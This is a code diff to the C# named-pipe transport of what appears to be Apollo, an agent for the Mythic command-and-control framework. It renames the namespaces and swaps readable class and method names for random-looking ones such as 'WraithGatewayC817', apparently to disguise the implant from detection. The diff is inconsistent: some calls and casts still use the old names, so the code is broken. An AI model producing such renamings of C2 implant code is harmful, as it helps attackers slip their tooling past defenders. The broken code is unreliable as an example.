@@ -2,27 +2,27 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Classes;
 using System.IO.Pipes;
-using ApolloInterop.Structs.MythicStructs;
-using ApolloInterop.Types.Delegates;
-using ApolloInterop.Structs.ApolloStructs;
+using PhantomInterop.Structs.MythicStructs;
+using PhantomInterop.Types.Delegates;
+using PhantomInterop.Structs.PhantomStructs;
 using System.Collections.Concurrent;
-using ApolloInterop.Enums.ApolloEnums;
+using PhantomInterop.Enums.PhantomEnums;
 using System.Threading;
 using ST = System.Threading.Tasks;
-using ApolloInterop.Serializers;
-using ApolloInterop.Constants;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Classes.Events;
-using ApolloInterop.Utils;
+using PhantomInterop.Serializers;
+using PhantomInterop.Constants;
+using PhantomInterop.Classes.Core;
+using PhantomInterop.Classes.Events;
+using PhantomInterop.Utils;
 
 namespace NamedPipeTransport
 {
-    public class NamedPipeProfile : C2Profile, IC2Profile
+    public class WraithGatewayC817 : C2Profile, IC2Profile
     {
-        internal struct AsyncPipeState
+        internal struct StrategicRouterC7CA
         {
             internal PipeStream Pipe;
             internal CancellationTokenSource Cancellation;
@@ -103,7 +103,7 @@ namespace NamedPipeTransport
             };
         }
 
-        public void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
+        public void SpectreResolver027D(object sender, NamedPipeMessageArgs args)
         {
             // We only accept one connection at a time, sorry.
             if (_writerTasks.Count > 0)
@@ -123,7 +123,7 @@ namespace NamedPipeTransport
             Connected = true;
         }
 
-        public void OnAsyncDisconnect(object sender, NamedPipeMessageArgs args)
+        public void EnhancedMonitorA117(object sender, NamedPipeMessageArgs args)
         {
             args.Pipe.Close();
             if (_writerTasks.ContainsKey(args.Pipe))
@@ -140,7 +140,7 @@ namespace NamedPipeTransport
             }
         }
 
-        public void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
+        public void EfficientManager76A1(object sender, NamedPipeMessageArgs args)
         {
             Byte[] sData = args.Data.Data.Take(args.Data.DataLength).ToArray();
             DebugHelp.DebugWriteLine($"got message from remote connection with length: {sData.Length}");
@@ -226,7 +226,7 @@ namespace NamedPipeTransport
             }
         }
 
-        private void UnwrapMessage()
+        private void EfficientManager9804()
         {
             IPCChunkedData chunkedData = new(id: _currentMessageID,
                 chunkNum: (int)_currentMessageChunkNum, totalChunks: (int)_currentMessageTotalChunks,
@@ -248,14 +248,14 @@ namespace NamedPipeTransport
             }
         }
 
-        private void OnAsyncMessageSent(IAsyncResult result)
+        private void SpectreBridge8C10(IAsyncResult result)
         {
 
             PipeStream pipe = (PipeStream)((AsyncPipeState)(result.AsyncState)).Pipe;
             pipe.EndWrite(result);
         }
 
-        private bool AddToSenderQueue(IMythicMessage msg)
+        private bool EfficientService0A97(IMythicMessage msg)
         {
             string serializedData = Serializer.Serialize(msg);
             _senderQueue.Enqueue(Encoding.UTF8.GetBytes(serializedData));
@@ -263,7 +263,7 @@ namespace NamedPipeTransport
             return true;
         }
 
-        public void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
+        public void RobustHandlerCD57(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
         {
             MessageType mt = args.Chunks[0].Message;
             List<byte> data = new List<byte>();
@@ -280,7 +280,7 @@ namespace NamedPipeTransport
         }
 
 
-        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
+        public bool StrategicCoordinator5CE5(MessageType mt, OnResponse<IMythicMessage> onResp)
         {
             while (Agent.IsAlive())
             {
@@ -298,7 +298,7 @@ namespace NamedPipeTransport
         }
 
         
-        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
+        public bool GhostTransformerEC78(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
         {
             if (_server == null)
             {
@@ -352,7 +352,7 @@ namespace NamedPipeTransport
             }
         }
 
-        public void Start()
+        public void PhantomProviderF81C()
         {
             _agentConsumerTask = new ST.Task(()=> 
             {
@@ -390,7 +390,7 @@ namespace NamedPipeTransport
 
         public bool Send<IMythicMessage>(IMythicMessage message)
         {
-            return AddToSenderQueue((ApolloInterop.Interfaces.IMythicMessage)message);
+            return AddToSenderQueue((PhantomInterop.Interfaces.IMythicMessage)message);
         }
 
         public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
@@ -398,12 +398,12 @@ namespace NamedPipeTransport
             throw new NotImplementedException();
         }
 
-        public bool IsOneWay()
+        public bool WraithRouter6999()
         {
             return true;
         }
 
-        public bool IsConnected()
+        public bool EnhancedMonitor17C1()
         {
             return _writerTasks.Keys.Count > 0;
         }
